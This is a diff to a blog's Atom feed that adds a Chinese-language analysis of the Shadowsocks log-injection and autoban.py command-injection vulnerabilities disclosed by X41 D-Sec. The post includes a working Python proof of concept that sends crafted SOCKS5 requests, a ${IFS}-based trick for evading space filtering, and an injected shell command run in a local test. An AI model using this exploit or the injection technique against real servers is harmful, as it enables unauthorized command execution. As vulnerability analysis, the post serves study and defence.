@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://retanoj.github.io/"/>
-  <updated>2016-11-26T12:08:01.000Z</updated>
+  <updated>2017-10-14T16:34:33.000Z</updated>
   <id>http://retanoj.github.io/</id>
   
   <author>
@@ -14,6 +14,63 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>X41 D-Sec Shadowsocks REC分析</title>
+    <link href="http://retanoj.github.io/2017/11/14/Python-2017-10-14-X41-D-Sec-Shadowsocks-REC%E5%88%86%E6%9E%90/"/>
+    <id>http://retanoj.github.io/2017/11/14/Python-2017-10-14-X41-D-Sec-Shadowsocks-REC分析/</id>
+    <published>2017-11-13T16:00:00.000Z</published>
+    <updated>2017-10-14T16:34:33.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>10月13号X41 D-Sec组织披露了有关Shadowsocks的一些漏洞，<a href="https://x41-dsec.de/lab/advisories/x41-2017-008-shadowsocks/" target="_blank" rel="external">文章在此</a>。以下对文中提及的日志文件写入和命令执行漏洞进行简要分析。</p>
+<p>漏洞细节还是很简单的，但其中涉及到了一些小技巧还是可以提一提的。</p>
+<h2 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h2><ol>
+<li>日志文件写入漏洞原因在于Shadowsocks基于Socks5的代理是支持用域名作为连接目标的，在精心构造目标域名为可控内容时，Shadowsocks会将其直接写入日志。</li>
+<li>命令执行漏洞原因在于Shadowsocks提供的用于检测与封禁暴力破解IP的autoban.py脚本在处理日志时不严谨，造成字符串拼接形式的命令执行。</li>
+</ol>
+<h2 id="LOG-FILE-MANIPULATION"><a href="#LOG-FILE-MANIPULATION" class="headerlink" title="LOG FILE MANIPULATION"></a>LOG FILE MANIPULATION</h2><p>角色有三：ss服务器端，ss客户端和用户端。</p>
+<p>ss客户端作为socks5代理，在接收到用户端发送过来的请求后，会对请求进行解析。关键解析函数shadowsocks/common.py中parse_header(data)函数在判断请求目标地址类型为域名后，会将其写入日志文件。</p>
+<p>ss客户端会将请求向后传输给ss服务器端，ss服务器端也会如上写入日志。</p>
+<p>因此，如果可以控制用户端请求的目标地址部分，即可将任意内容写入日志。简单写个脚本如下，9001是ss客户端地址：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="keyword">import</span> socket</div><div class="line"></div><div class="line">eval_data = <span class="string">"foo\nbar\ntail"</span></div><div class="line"></div><div class="line">hello = <span class="string">"050100"</span>.decode(<span class="string">'hex'</span>)</div><div class="line">target = (<span class="string">"05010003%02x%s0050"</span> % (len(eval_data), eval_data.encode(<span class="string">'hex'</span>))).decode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">9001</span>))</div><div class="line"></div><div class="line">s.send(hello)</div><div class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</div><div class="line">s.send(target)</div><div class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</div><div class="line"></div><div class="line">s.close()</div></pre></td></tr></table></figure>
+<p>查看日志：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt; cat /tmp/ss/client.log</div><div class="line"></div><div class="line">2017-10-14 20:34:00 INFO     connecting foo</div><div class="line">bar</div><div class="line">tail:80 from 127.0.0.1:62977</div></pre></td></tr></table></figure>
+<p>可以看到，“bar”是单行写入的，漏洞触发成功。</p>
+<h2 id="COMMAND-EXECUTION"><a href="#COMMAND-EXECUTION" class="headerlink" title="COMMAND EXECUTION"></a>COMMAND EXECUTION</h2><p>autoban.py脚本的作用是通过检查ss日志中的错误来对请求来源ip进行一些封禁处理。脚本处于shadowsocks/utils/autoban.py。</p>
+<p>内容简短说就是按行查日志，如果出现</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">can not parse header when</div></pre></td></tr></table></figure>
+<p>关键字符串在行内就进一步处理，最终提取来源IP拼接进cmd执行。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cmd = <span class="string">'iptables -A INPUT -s %s -j DROP'</span> % ip</div><div class="line">os.system(cmd)</div></pre></td></tr></table></figure>
+<p>也就是说，在日志内容可控的情况下，完全可以通过精心构造请求来达到ip的内容可控，从而造成命令执行。</p>
+<p>这里有三个坑：</p>
+<ol>
+<li>命令内容不能有空格，不然被切开了</li>
+<li>命令内容不能有冒号，不然被切开了</li>
+<li>脚本查来源ip是有频次控制的，默认为3。也就是攻击请求需要发三次以上才会触发autoban的ban。</li>
+</ol>
+<p>源文中为了绕过空格限制，给出的POC用到了一个将日志作为脚本执行的方法，但并不是很好，因为需要知道ss的日志存储路径。如果路径非默认，就没用了。</p>
+<p>这里需要提一下执行bash脚本不用空格的方法。主要用到了${IFS}环境变量，${IFS}=‘空格\n\t’，空格在第一个字符。<br>直接给出吧：</p>
+<ol>
+<li>echo “a${IFS:0:1}b” 从0位置截取1个字符，这里不能用，因为引入冒号了</li>
+<li>echo “a${IFS%????}b” %逆向裁掉4个字符，?是占位符，这个可以用</li>
+</ol>
+<p>因此POC也呼之欲出了：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eval_data = <span class="string">"can not parse header when ||touch<span class="variable">$&#123;IFS%???&#125;</span>&gt;<span class="variable">$&#123;IFS%???&#125;</span>/tmp/ss/eval.txt&amp;:\n"</span></div></pre></td></tr></table></figure></p>
+<p>最后给出完成测试过程：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">启动ss服务端</div><div class="line">python server.py <span class="_">-s</span> 127.0.0.1 -p 9000 -k 1234 --log-file /tmp/ss/server.log --pid-file /tmp/ss/server.pid <span class="_">-d</span> start</div><div class="line"></div><div class="line">启动ss客户端</div><div class="line">python local.py <span class="_">-s</span> 127.0.0.1 -p 9000 <span class="_">-l</span> 9001 -k 1234 --log-file /tmp/ss/client.log --pid-file /tmp/ss/client.pid <span class="_">-d</span> start</div><div class="line"></div><div class="line">模拟定时启动autoban.py脚本检查ss客户端日志</div><div class="line">watch -n 1 <span class="string">"python autoban.py &lt; /tmp/ss/client.log"</span></div><div class="line"></div><div class="line">执行POC(3次！！3次！！3次！！默认就是3次！！我不写循环:)</div><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line">import socket</div><div class="line"></div><div class="line">eval_data = <span class="string">"can not parse header when ||touch<span class="variable">$&#123;IFS%???&#125;</span>&gt;<span class="variable">$&#123;IFS%???&#125;</span>/tmp/ss/eval.txt&amp;:\n"</span></div><div class="line"></div><div class="line">hello = <span class="string">"050100"</span>.decode(<span class="string">'hex'</span>)</div><div class="line">target = (<span class="string">"05010003%02x%s0050"</span> % (len(eval_data), eval_data.encode(<span class="string">'hex'</span>))).decode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">s.connect((<span class="string">'127.0.0.1'</span>, 9001))</div><div class="line"></div><div class="line">s.send(hello)</div><div class="line"><span class="built_in">print</span> s.recv(1024)</div><div class="line">s.send(target)</div><div class="line"><span class="built_in">print</span> s.recv(1024)</div><div class="line"></div><div class="line">s.close()</div><div class="line"></div><div class="line">查看eval.txt是否存在</div><div class="line">ls -al /tmp/ss/eval.txt</div></pre></td></tr></table></figure></p>
+<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>谁没事儿会用autoban.py啊，大家的ss还是很安全的 :)</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;10月13号X41 D-Sec组织披露了有关Shadowsocks的一些漏洞，&lt;a href=&quot;https://x41-dsec.de/la
+    
+    </summary>
+    
+      <category term="Python" scheme="http://retanoj.github.io/categories/Python/"/>
+    
+    
+      <category term="Python" scheme="http://retanoj.github.io/tags/Python/"/>
+    
+  </entry>
   
   <entry>
     <title>Java反序列化漏洞原理小记</title>
